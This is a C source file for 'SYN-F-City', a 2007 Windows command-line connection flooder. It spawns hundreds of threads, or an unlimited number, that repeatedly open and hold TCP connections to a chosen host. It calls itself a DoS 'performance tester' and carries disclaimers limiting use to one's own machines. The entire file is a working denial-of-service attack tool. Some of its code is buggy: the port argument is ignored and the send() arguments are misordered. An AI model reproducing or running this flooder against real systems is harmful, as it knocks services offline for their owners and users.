/*
SYN-F-City
SynFlooder ( Optimized for DEV-C++ )
I made this like a PortFuck alternative for Microsoft Windows Commandline.
You can do anything what you want with this piece of software (and source code),
but only at yours own risk and responsibility.
You can modify and distribute this software as long as it's not used in public
networks or against extraneous computer and as long as my name is mentioned.
Sorry for my poor english and use it well. ;D

                                                     <- Harvie 2oo7 */
                                                     
//Includes
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <winsock2.h> //don't forget to include Dev-Cpp/lib/libwsock32.a

//Settings
#define HOSTLEN 256 //Maximum hostname lenght
char target_host[HOSTLEN] = "127.0.0.1"; //host
unsigned int target_port = 80; //port
int delay = 1000; //sleep in ms
unsigned int threads_max = 300; //0 == infinite
char mode = 1; //0 = reconnect on connect; 1 = wait for disconnection by server
#define DATALEN 1024 //Maximum data lenght
char snd_data[DATALEN] = ""; //Data to send (Optional)

//Init
char product[] = "SYNFCity";
char version[] = "0.4 (2oo7)";
int thread_report = 10;
unsigned int thread_no = 1;

//Socket thread
unsigned __stdcall SecondThreadFunc( void* pArguments )
{
    unsigned int this_thread_no = thread_no;
    //system("cls");
    //printf( "[d] Thread #%d\n", this_thread_no ); //Debug
    
    //Sock///////////////////////////////////////
    int s;
    SOCKADDR_IN sck;
    HOSTENT *host;
    WSADATA wsadata;
    
    WSAStartup(MAKEWORD(1,1),&wsadata);
    
    if( (host=gethostbyname(target_host)) == NULL ) {
        printf("\n[!] Host not found !!!\n");
        exit(1);
        }
    sck.sin_family = PF_INET;
    memcpy(&sck.sin_addr.s_addr, host->h_addr, host->h_length);
    sck.sin_port = htons(80);
      
    while(1) {
             s=socket(AF_INET, SOCK_STREAM,0);
             while( !( connect(s,(struct sockaddr *)&sck,sizeof(sck)) ) ) { Sleep(100); }
             if( strlen(snd_data) > 0 ) {
                 send(s,snd_data,0,strlen(snd_data)); //Send data
                 }
             if(mode) {
                      while( send(s,snd_data,0,strlen(snd_data)) != -1 ) { Sleep(3000);} //Wait for server side close
                      }
             //printf("[d] Reconnecting #%d\n", this_thread_no); //Debug
             closesocket(s);
    }
    //Sock end//////////////////////////////////

    _endthreadex( 0 );
    return 0;
} 

//MAIN
int main(int argc, char *argv[])
{ 
    //Help
    if(argc < 3) { 
            printf("\n%s %s\n\nHarvie's Windows SYNFlood based service performance tester\n(PortFuck commandline alternative)\n\n", product, version);
            printf("   Usage: %s host port [delay] [socks_max] [mode] [\"data\"]\n\n", product);
            printf("host - yours testing target\n");
            printf("port - port with target service\n");
            printf("delay - wait between thread creating (ms)\n");
            printf("socks_max - maximum of threads/sockets; 0 = infinite -don't do with short delay\n");
            printf("mode - (0|1); 0 = reconnect on connect; 1 = wait for disconnection by server\n");
            printf("data - send this string to the server (\"\\n\\n\" will be added)\n");
            printf("\n");
            printf("This values will be used implicitly:\n   %s %s %d %d %d %d \"%s\"\n", product, target_host, target_port, delay, threads_max, mode, snd_data);
            printf("\n\n");
            printf(" !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf(" !! WARNING - TERMS OF USE - READ CAREFULLY !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf(" !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf(" !!!!!!!!! THIS IS FREEWARE AND COMES WITH ABSOLUTELY NO WARRANTY !!!!!!!!!!!!!\n");
            printf(" !!!!!!!!! IT'S PROHIBITED TO USE THIS SOFTWARE IN PUBLIC NETWORKS !!!!!!!!!!!!\n");
            printf(" !!!!!!!!! USE THIS TEST ONLY AGAINST YOURS OWN COMPUTERS !!!!!!!!!!!!!!!!!!!!!\n");
            printf(" !!!!!!!!! YOU HAVE FULL RESPONSIBILITY FOR USING THIS PROGRAM !!!!!!!!!!!!!!!!\n");
            printf(" !!!!!!!!! YOU HAVE FULL RESPONSIBILITY FOR YOU !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf(" !!!!!!!!! USE THIS ONLY ON YOURS OWN RISK !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf(" !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf(" !!!! DON'T USE THIS SOFTWARE IF YOU DOESN'T UNDERSTOOD OR YOU DON'T AGREE !!!!\n");
            printf(" !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf(" !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! <- HARVIE 2oo7 !!!\n");
            printf(" !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
            printf(" !I have done this only to test my own server's resistance against DoS attacks!\n");
            printf("\n");
            if(argc < 2) { 
                    printf("Press any key, if you are sure, that you understand and you agree with terms of use. Otherwise close the window. (Run this program with more than zero arguments to prevent this confirmation, if you want dump help to file, etc...)\n");
                    system("pause");
                    }
            return(1);
            }
    
    //Parse arguments
    if(argc > 1) { snprintf(target_host, HOSTLEN, "%s", argv[1]); }
    if(argc > 2) { target_port = atoi(argv[2]); }
    if(argc > 3) { delay = atoi(argv[3]); }
    if(argc > 4) { threads_max = atof(argv[4]); }
    if(argc > 5) { mode = atoi(argv[5]); }
    if(argc > 6) { snprintf(snd_data, DATALEN,"%s", argv[6]); }
    printf("[*] %s host: %s port: %d\n[i] delay: %d socks_max: %d mode: %d data: %s", product, target_host, target_port, delay, threads_max, mode, snd_data);
    if(strlen(snd_data) > 0) { snprintf(snd_data, DATALEN,"%s\n\n", snd_data); }
    
    
    //Load
    HANDLE hThread;
    unsigned threadID;
    printf("[!] SynFlooding %s:%d\n[i] C-c 2 stop\n\n", target_host, target_port);
    printf( "[T] Creatin' some threadzz... ;))\n" );
    printf( "[i] Showing only each %dth thread:\n", thread_report );

    //Fire ;))
    while(1) {
             hThread = (HANDLE)_beginthreadex( NULL, 0, &SecondThreadFunc, NULL, 0, &threadID );
             if(hThread == 0) {
                        printf("\n[!] Reached maximum number of threads allowed by system.\n");
                        break;
                        }
             if(thread_no % thread_report == 0) {
               printf( "[#] Thread #%d was succesfully created.\n", thread_no ); //Debug
               }
             Sleep(delay);
             thread_no++;
             if(threads_max != 0) {
                            if(thread_no > threads_max) { 
                                         printf("\n[!] Reached previously selected maximum number of threads.\n");
                                         break;
                                         }
             }
    }
    
    printf("[!] Working...\n[i] C-c 2 stop\n\n");
    //Doo something useful while running ;D
    while(1) { sleep(60000); }
}
